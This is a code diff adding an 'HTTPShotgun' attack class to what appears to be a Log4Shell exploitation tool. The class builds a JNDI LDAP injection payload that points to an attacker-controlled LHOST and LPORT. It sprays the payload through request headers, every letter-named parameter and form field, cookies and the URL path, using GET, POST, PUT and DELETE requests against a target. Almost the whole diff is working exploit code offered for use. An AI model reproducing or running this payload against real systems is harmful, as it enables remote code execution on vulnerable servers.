@@ -1,5 +1,6 @@
 import multiprocessing
 import requests
+import string
 
 from handlers import LDAB, HTTB
 
@@ -48,5 +49,31 @@ class AttackWithHTTPHeader(Attack):
         self.trigger_vulnerability(header_name)
         self.kill_server_processes()
 
+
 class HTTPShotgun(Attack):
-    pass
+    def trigger_vulnerability(self):
+        jndi = "${jndi:ldap://{LHOST}:{LPORT}{query_name}}".replace("{LHOST}", self.lhost).replace("{LPORT}", self.ldap_port).replace("{query_name}", self.query_name)
+
+        header_names = ["User-Agent", "X-Api-Version"]
+        headers = {name: jndi for name in header_names}
+        params = {name: jndi for name in string.ascii_letters}
+        params[jndi] = jndi
+        cookies = {jndi: jndi}
+        path = self.target_url + "/" + jndi
+        data = {name: jndi for name in string.ascii_letters}
+        data[jndi] = jndi
+
+        requests.get(url=path, data=data, headers=headers, cookies=cookies, params=params)
+        requests.get(url=self.target_url, data=data, headers=headers, cookies=cookies, params=params)
+        requests.post(url=path, data=data, headers=headers, cookies=cookies, params=params)
+        requests.post(url=self.target_url, data=data, headers=headers, cookies=cookies, params=params)
+        requests.put(url=path, data=data, headers=headers, cookies=cookies, params=params)
+        requests.put(url=self.target_url, data=data, headers=headers, cookies=cookies, params=params)
+        requests.delete(url=path, data=data, headers=headers, cookies=cookies, params=params)
+        requests.delete(url=self.target_url, data=data, headers=headers, cookies=cookies, params=params)
+        
+    def attack(self):
+        print("attacking")
+        self.server_processes()
+        self.trigger_vulnerability()
+        self.kill_server_processes()
